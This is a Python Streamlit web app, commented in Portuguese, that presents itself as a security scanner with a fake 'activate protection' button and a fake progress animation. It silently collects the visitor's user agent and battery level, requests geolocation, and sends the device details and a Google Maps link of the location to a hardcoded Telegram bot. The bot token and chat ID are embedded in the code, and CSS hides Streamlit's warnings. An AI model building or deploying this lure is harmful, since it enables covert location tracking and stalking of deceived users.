import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. DADOS DO TELEGRAM
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

def enviar_telegram(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try: 
        requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
    except: 
        pass

# 2. CONFIGURAÇÃO DA PÁGINA E CSS (BOLHA + OCULTAR ALERTAS)
st.set_page_config(page_title="Sistema de Segurança", layout="centered")

st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    /* OCULTA TODOS OS AVISOS AMARELOS DO STREAMLIT */
    .stAlert, [data-testid="stNotificationContent"] { display: none !important; }
    
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }
    div.stButton > button {
        background-color: #ffc107 !important; color: black !important;
        font-weight: bold !important; width: 100%; height: 3.5em; border-radius: 10px; border: none;
    }
    </style>
""", unsafe_allow_html=True)

# 3. CAPTURA SILENCIOSA (MODELO E BATERIA)
# Capturados via JS assim que a página carrega
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='DEVICE_INFO')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_INFO')

# 4. INTERFACE VISUAL
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
espaco_bolha = st.empty()

# Inicializa o estado se não existir
if 'ativo' not in st.session_state:
    st.session_state['ativo'] = False

# Bolha estática em 4% antes do clique
if not st.session_state['ativo']:
    with espaco_bolha.container():
        st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# 5. BOTÃO DE ATIVAÇÃO
if st.button("🔴 ATIVAR PROTEÇÃO"):
    st.session_state['ativo'] = True

# 6. LÓGICA DE LOCALIZAÇÃO E ANIMAÇÃO 0-100%
if st.session_state['ativo']:
    # O navegador pede permissão aqui (Pop-up)
    loc = get_geolocation() 
    
    # Só prossegue se 'coords' estiver presente (Resolve erro da linha 51)
    if loc and 'coords' in loc:
        # Animação da bolha carregando de 0% a 100% dentro do ciclo
        for p in range(0, 101, 10):
            espaco_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
            time.sleep(0.05)
        
        # Coleta de dados finais
        lat = loc['coords']['latitude']
        lon = loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        # Montagem do relatório
        relatorio = (
            f"🛡️ PROTEÇÃO ATIVADA\n\n"
            f"📱 Aparelho: {ua[:55] if ua else 'Desconhecido'}\n"
            f"🔋 Bateria: {bat if bat else '--'}%\n"
            f"📍 [VER LOCALIZAÇÃO]({mapa})"
        )
        
        enviar_telegram(relatorio)
        
        # Mensagem final solicitada
        st.success("Localização concluída")
        st.session_state['ativo'] = False
        st.stop()
    else:
        # Se ainda não permitiu, o app espera sem mostrar aviso amarelo
        time.sleep(1)
        st.rerun()

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
